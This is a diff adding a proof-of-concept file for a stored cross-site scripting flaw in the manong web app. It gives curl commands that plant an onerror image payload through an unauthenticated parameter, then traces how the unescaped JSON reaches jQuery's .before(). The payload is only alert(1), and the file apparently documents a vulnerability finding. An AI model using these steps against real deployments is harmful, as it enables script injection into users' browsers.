@@ -1,0 +1,30 @@
+MANONG-04 PoC — Stored XSS via newcate -> issue.category -> a=cate JSON -> jQuery .before() (CWE-79)
+Target: https://github.com/nemoTyrant/manong commit 7c9e522 (see TARGET-SOURCE.txt)
+Payload is a harmless alert(1) marker.
+
+--- Step 1: plant the payload (unauthenticated) ---------------------------------------------
+curl 'http://<MANONG-HOST>/index.php?a=add&title=t&desc=d&href=h&number=1&newcate=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'
+# => {"res":1,"msg":"success","cate":"<IMG SRC=X ONERROR=ALERT(1)>"}
+#    stored in issue.category (write side: trim() + mb_strtoupper() only - no HTML encoding)
+
+--- Step 2: the sink the victim's browser hits (operator submits a crawl in the UI) ----------
+curl 'http://<MANONG-HOST>/index.php?a=cate'
+# => application/json; the html field embeds the payload UNESCAPED in BOTH option positions:
+#    <option value="<IMG SRC=X ONERROR=ALERT(1)>"><IMG SRC=X ONERROR=ALERT(1)></option>
+
+--- Step 3: DOM injection (manong.php:61-70, runs in the victim's browser) ------------------
+// after every crawl submit:
+$.getJSON('index.php?a=cate',function(data){
+    catelist=data.cate;
+    $('.add').each(function(i){
+        $(this).before(data.html);   // HTML-string parse -> the inner-text instance becomes a
+    });                              // live <img src=x> element; failed load fires onerror=alert(1)
+});
+# Uppercase tags are valid HTML, so <IMG SRC=X ONERROR=ALERT(1)> executes as markup.
+
+--- Verification notes ----------------------------------------------------------------------
+# - planted value verified directly in the DB (issue.category row)
+# - a=cate JSON captured unescaped (attribute + inner text)
+# - .before(htmlString) parses markup into live DOM nodes (jQuery semantics)
+# - no headless browser dialog captured in the lab; execution established by the exact
+#   verified sink code path (see evidence/MANONG-04.txt)
